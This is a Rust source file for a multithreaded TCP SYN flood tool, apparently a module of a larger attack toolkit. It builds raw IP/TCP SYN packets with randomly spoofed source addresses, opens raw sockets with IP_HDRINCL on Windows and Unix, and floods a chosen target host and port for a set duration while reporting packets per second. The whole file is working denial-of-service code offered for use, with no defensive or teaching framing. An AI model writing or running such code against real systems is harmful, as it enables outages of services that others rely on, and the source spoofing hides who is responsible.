use std::collections::HashMap;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use rand::Rng;

/// Compute the Internet checksum (RFC 1071) over a byte slice.
fn checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    let mut i = 0;
    let len = data.len();

    while i + 1 < len {
        let word = ((data[i] as u32) << 8) | (data[i + 1] as u32);
        sum += word;
        i += 2;
    }
    // If odd length, pad with zero byte
    if i < len {
        sum += (data[i] as u32) << 8;
    }
    // Fold 32-bit sum into 16 bits
    while (sum >> 16) != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    !sum as u16
}

/// Build a raw IP + TCP SYN packet with spoofed source IP.
fn build_syn_packet(src_ip: [u8; 4], dst_ip: [u8; 4], src_port: u16, dst_port: u16) -> Vec<u8> {
    let mut packet = Vec::with_capacity(40);

    // ----- IP Header (20 bytes) -----
    let total_len: u16 = 40; // IP(20) + TCP(20)
    let ip_id: u16 = rand::thread_rng().gen();

    packet.push(0x45); // Version=4, IHL=5
    packet.push(0x00); // DSCP / ECN
    packet.extend_from_slice(&total_len.to_be_bytes()); // Total length
    packet.extend_from_slice(&ip_id.to_be_bytes()); // Identification
    packet.push(0x40); // Flags: Don't Fragment
    packet.push(0x00); // Fragment offset
    packet.push(64); // TTL
    packet.push(6); // Protocol: TCP
    packet.push(0x00); // Header checksum (placeholder)
    packet.push(0x00);
    packet.extend_from_slice(&src_ip); // Source IP
    packet.extend_from_slice(&dst_ip); // Destination IP

    // Compute IP header checksum
    let ip_cksum = checksum(&packet[0..20]);
    packet[10] = (ip_cksum >> 8) as u8;
    packet[11] = (ip_cksum & 0xFF) as u8;

    // ----- TCP Header (20 bytes) -----
    let seq_num: u32 = rand::thread_rng().gen();
    let tcp_start = packet.len();

    packet.extend_from_slice(&src_port.to_be_bytes()); // Source port
    packet.extend_from_slice(&dst_port.to_be_bytes()); // Destination port
    packet.extend_from_slice(&seq_num.to_be_bytes()); // Sequence number
    packet.extend_from_slice(&0u32.to_be_bytes()); // Acknowledgment number
    packet.push(0x50); // Data offset: 5 (20 bytes), no flags upper nibble
    packet.push(0x02); // Flags: SYN
    packet.extend_from_slice(&65535u16.to_be_bytes()); // Window size
    packet.push(0x00); // Checksum (placeholder)
    packet.push(0x00);
    packet.extend_from_slice(&0u16.to_be_bytes()); // Urgent pointer

    // Compute TCP checksum with pseudo-header
    let tcp_len: u16 = 20;
    let mut pseudo = Vec::with_capacity(32);
    pseudo.extend_from_slice(&src_ip);
    pseudo.extend_from_slice(&dst_ip);
    pseudo.push(0x00); // Reserved
    pseudo.push(6); // Protocol: TCP
    pseudo.extend_from_slice(&tcp_len.to_be_bytes());
    pseudo.extend_from_slice(&packet[tcp_start..]); // TCP header

    let tcp_cksum = checksum(&pseudo);
    let cksum_offset = tcp_start + 16;
    packet[cksum_offset] = (tcp_cksum >> 8) as u8;
    packet[cksum_offset + 1] = (tcp_cksum & 0xFF) as u8;

    packet
}

/// Generate a random spoofed source IP (avoids reserved ranges).
fn random_ip() -> [u8; 4] {
    let mut rng = rand::thread_rng();
    loop {
        let a: u8 = rng.gen_range(1..=254);
        let b: u8 = rng.gen();
        let c: u8 = rng.gen();
        let d: u8 = rng.gen_range(1..=254);
        // Skip loopback 127.x.x.x, multicast 224-239, private 10.x, 192.168.x
        if a == 127 || a == 10 || a == 0 || (a == 192 && b == 168) || a >= 224 {
            continue;
        }
        return [a, b, c, d];
    }
}

/// Resolve a target string to 4 bytes.
fn resolve_target(target: &str) -> std::io::Result<[u8; 4]> {
    use std::net::ToSocketAddrs;
    let addr = format!("{}:0", target)
        .to_socket_addrs()?
        .find(|a| a.is_ipv4())
        .ok_or_else(|| std::io::Error::new(std::io::ErrorKind::Other, "Could not resolve target to IPv4"))?;

    if let std::net::SocketAddr::V4(v4) = addr {
        Ok(v4.ip().octets())
    } else {
        Err(std::io::Error::new(std::io::ErrorKind::Other, "Not IPv4"))
    }
}

pub struct TcpSynFlood {
    target: String,
    duration: u64,
    threads: u32,
    port: u16,
    stop_flag: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
    callback: Arc<dyn Fn(&str) + Send + Sync>,
}

impl TcpSynFlood {
    pub fn new(
        target: String,
        duration: u64,
        threads: u32,
        port: u16,
        callback: Arc<dyn Fn(&str) + Send + Sync>,
    ) -> Self {
        Self {
            target,
            duration,
            threads,
            port,
            stop_flag: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
            callback,
        }
    }

    pub fn stop(&self) {
        self.stop_flag.store(true, Ordering::SeqCst);
    }

    pub fn run(&self) -> HashMap<String, String> {
        let dst_ip = match resolve_target(&self.target) {
            Ok(ip) => ip,
            Err(e) => {
                (self.callback)(&format!("[!] Failed to resolve target: {}", e));
                let mut stats = HashMap::new();
                stats.insert("error".into(), e.to_string());
                return stats;
            }
        };

        (self.callback)(&format!(
            "[*] Launching TCP SYN Flood on {}:{} with {} threads for {}s",
            self.target, self.port, self.threads, self.duration
        ));
        (self.callback)("[!] Raw sockets required - must run as Administrator/root");

        let start = Instant::now();
        let dur = Duration::from_secs(self.duration);
        let mut handles = Vec::new();

        for _ in 0..self.threads {
            let stop = self.stop_flag.clone();
            let sent = self.packets_sent.clone();
            let port = self.port;
            let dst = dst_ip;

            let handle = std::thread::spawn(move || {
                // Try to create a raw socket via socket2
                let socket = match Self::create_raw_socket() {
                    Some(s) => s,
                    None => return,
                };

                let mut rng = rand::thread_rng();
                let dst_addr = std::net::SocketAddr::new(
                    std::net::IpAddr::V4(std::net::Ipv4Addr::new(dst[0], dst[1], dst[2], dst[3])),
                    port,
                );
                let sa: socket2::SockAddr = dst_addr.into();

                while !stop.load(Ordering::Relaxed) && start.elapsed() < dur {
                    let src_ip = random_ip();
                    let src_port: u16 = rng.gen_range(1024..=65535);
                    let packet = build_syn_packet(src_ip, dst, src_port, port);

                    if socket.send_to(&packet, &sa).is_ok() {
                        sent.fetch_add(1, Ordering::Relaxed);
                    }
                }
            });
            handles.push(handle);
        }

        // Stats thread
        let stop_s = self.stop_flag.clone();
        let sent_s = self.packets_sent.clone();
        let cb_s = self.callback.clone();
        let stats_handle = std::thread::spawn(move || {
            while !stop_s.load(Ordering::Relaxed) && start.elapsed() < dur {
                std::thread::sleep(Duration::from_secs(1));
                let s = sent_s.load(Ordering::Relaxed);
                let elapsed = start.elapsed().as_secs();
                let pps = if elapsed > 0 { s / elapsed } else { s };
                cb_s(&format!(
                    "[STATS] Packets sent: {} | PPS: {} | Elapsed: {}s",
                    s, pps, elapsed
                ));
            }
        });

        for h in handles {
            let _ = h.join();
        }
        self.stop_flag.store(true, Ordering::SeqCst);
        let _ = stats_handle.join();

        let total = self.packets_sent.load(Ordering::Relaxed);
        let elapsed = start.elapsed().as_secs_f64();

        let mut stats = HashMap::new();
        stats.insert("packets_sent".into(), total.to_string());
        stats.insert("duration".into(), format!("{:.1}s", elapsed));
        stats.insert(
            "pps".into(),
            format!("{:.0}", total as f64 / elapsed.max(1.0)),
        );
        stats
    }

    fn create_raw_socket() -> Option<socket2::Socket> {
        use socket2::{Domain, Socket, Type};

        // SOCK_RAW = 3 on both Windows and Linux
        let raw_type = Type::from(3_i32);

        let protocol = if cfg!(target_os = "windows") {
            Some(socket2::Protocol::from(255_i32)) // IPPROTO_RAW
        } else {
            Some(socket2::Protocol::from(6_i32)) // IPPROTO_TCP
        };

        match Socket::new(Domain::IPV4, raw_type, protocol) {
            Ok(s) => {
                // Set IP_HDRINCL so we provide the IP header ourselves
                #[cfg(target_os = "windows")]
                {
                    use std::os::windows::io::AsRawSocket;
                    let one: u32 = 1;
                    unsafe {
                        extern "system" {
                            fn setsockopt(s: usize, level: i32, optname: i32,
                                          optval: *const u8, optlen: i32) -> i32;
                        }
                        let _ = setsockopt(
                            s.as_raw_socket() as usize,
                            0,  // IPPROTO_IP
                            2,  // IP_HDRINCL
                            &one as *const u32 as *const u8,
                            4,
                        );
                    }
                }
                #[cfg(not(target_os = "windows"))]
                {
                    use std::os::unix::io::AsRawFd;
                    let one: i32 = 1;
                    unsafe {
                        libc::setsockopt(
                            s.as_raw_fd(),
                            libc::IPPROTO_IP,
                            libc::IP_HDRINCL,
                            &one as *const i32 as *const std::ffi::c_void,
                            4,
                        );
                    }
                }
                Some(s)
            }
            Err(_) => None,
        }
    }
}
